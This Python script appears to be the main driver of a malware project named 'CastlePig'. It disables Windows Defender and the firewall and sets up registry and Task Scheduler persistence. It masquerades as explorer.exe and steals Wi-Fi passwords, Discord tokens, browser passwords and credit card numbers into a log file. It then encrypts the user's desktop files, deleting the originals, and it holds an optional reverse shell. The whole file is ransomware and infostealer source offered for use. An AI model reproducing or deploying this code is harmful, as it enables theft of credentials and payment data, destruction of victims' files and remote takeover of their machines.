# CastlePig Encryption
import castle_pig.anti_analysis

castle_pig.anti_analysis.check_for_suspicious_processes()
castle_pig.anti_analysis.disable_defender_and_firewall()


import os
import threading
import castle_pig.file_encrypter
import castle_pig.file_decrypter
import castle_pig.task_scheduler
import castle_pig.secure_password
import castle_pig.keyring_password
import castle_pig.desktop_files
import castle_pig.reverse_shell

import castle_pig.persistence
# Add registry persistence
castle_pig.persistence.add_registry_persistence()

import castle_pig.process_blender
# Set the window title to mimic a legitimate process
castle_pig.process_blender.set_process_title_windows("explorer.exe")
# Uncomment below to run in a hidden window
# castle_pig.process_blender.run_hidden_windows()

# Secure delete
import castle_pig.secure_delete

#
#
#
# CastlePig Data Exfiltration

# Wifi
from data_grabber.wifi_grabber import grab_wifi_passwords

wifi_data = grab_wifi_passwords()
with open("log.txt", "a") as log:
    log.write("Wi-Fi Name                    | Password\n")
    log.write("------------------------------------------\n")
    for ssid, password in wifi_data:
        log.write(f"{ssid:<30}| {password}\n")

# Discord
from data_grabber.discord_token_grabber import find_discord_tokens

tokens = find_discord_tokens()
with open("log.txt", "a") as log:
    log.write("Discord Tokens:\n")
    for token in tokens:
        log.write(token + "\n")

# Browser Passwords, cards, bookmarks
from data_grabber.browser_data_grabber import (
    extract_browser_passwords,
    extract_browser_cards,
    extract_browser_bookmarks
)

with open("log.txt", "a", encoding="utf-8") as log:
    log.write("Browser Passwords:\n")
    for entry in extract_browser_passwords():
        log.write(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}\n")

    log.write("\nBrowser Credit Cards:\n")
    for entry in extract_browser_cards():
        log.write(f"[{entry['browser']}] {entry['name']} | {entry['card_number']} | {entry['exp_month']}/{entry['exp_year']}\n")

    log.write("\nBrowser Bookmarks:\n")
    for entry in extract_browser_bookmarks():
        log.write(f"[{entry['browser']}] {entry['name']} | {entry['url']}\n")

# .env loadenv file is populated
# Uncomment below to use and clean up any unneeded code
"""
import os
from dotenv import load_dotenv
import sys

load_dotenv()

# Required variables
SERVICE_NAME = os.getenv("SERVICE_NAME")
USERNAME = os.getenv("USERNAME")
ENCRYPTED_FOLDER = os.getenv("ENCRYPTED_FOLDER")

# Optional variables
ENABLE_REVERSE_SHELL = os.getenv("ENABLE_REVERSE_SHELL")
REVERSE_SHELL_IP = os.getenv("REVERSE_SHELL_IP")
REVERSE_SHELL_PORT = os.getenv("REVERSE_SHELL_PORT")

# Check for required variables
required_vars = {
    "SERVICE_NAME": SERVICE_NAME,
    "USERNAME": USERNAME,
    "ENCRYPTED_FOLDER": ENCRYPTED_FOLDER,
}

missing = [k for k, v in required_vars.items() if v is None]
if missing:
    print(f"Error: Missing required environment variables: {', '.join(missing)}")
    sys.exit(1)

# Set defaults for optional variables if not set
if ENABLE_REVERSE_SHELL is None:
    ENABLE_REVERSE_SHELL = False
else:
    ENABLE_REVERSE_SHELL = ENABLE_REVERSE_SHELL.lower() == "true"

if REVERSE_SHELL_IP is None:
    REVERSE_SHELL_IP = "127.0.0.1"

if REVERSE_SHELL_PORT is None:
    REVERSE_SHELL_PORT = 4444
else:
    REVERSE_SHELL_PORT = int(REVERSE_SHELL_PORT)
"""

# === Configuration ===
SERVICE_NAME = "CastlePig"
USERNAME = "one_dumb_pig"
ENCRYPTED_FOLDER = "EncryptedFiles"
ENABLE_REVERSE_SHELL = False  # Set to True to enable reverse shell
REVERSE_SHELL_IP = "127.0.0.1"
REVERSE_SHELL_PORT = 4444
DELTE_FILE = False

# Get all files from the user's Desktop (recursively)
files = castle_pig.desktop_files.get_all_files_from_desktop() # Assuming this is in desktop_files

def main():
    # 0. Optionally run reverse shell in a background thread
    if ENABLE_REVERSE_SHELL:
        rs = threading.Thread(
            target=castle_pig.reverse_shell.shell,
            args=(REVERSE_SHELL_IP, REVERSE_SHELL_PORT),
            daemon=True
        )
        rs.start()
        print("Reverse shell started in background.")

    # 1. Get or generate a secure password
    try:
        password = castle_pig.keyring_password.load_password_from_keyring(
            service_name=SERVICE_NAME, username=USERNAME
        )
        print("Loaded existing password from keyring.")
    except Exception:
        password = castle_pig.secure_password.generate_secure_password(32)
        castle_pig.keyring_password.save_password_to_keyring(
            password, service_name=SERVICE_NAME, username=USERNAME
        )
        print("Generated and saved new password to keyring.")

    # 2. Add this script to Task Scheduler (Windows only)
    castle_pig.task_scheduler.add_to_task_scheduler()

    # 3. Encrypt each file in the files list
    os.makedirs(ENCRYPTED_FOLDER, exist_ok=True)
    for _file in files:
        encrypted_path = castle_pig.file_encrypter.encrypt_file(
            _file,
            password=password,
            delete_original=True,
            move_to_folder=ENCRYPTED_FOLDER
        )
        if DELTE_FILE:
            castle_pig.secure_delete.secure_delete(_file)
            print(f"Deleted: {_file}")
        else:
            print(f"Not deleting: {_file}")
        if encrypted_path:
            print(f"Encrypted file at: {encrypted_path}")
        else:
            print(f"Failed to encrypt: {_file}")

if __name__ == "__main__":
    main()
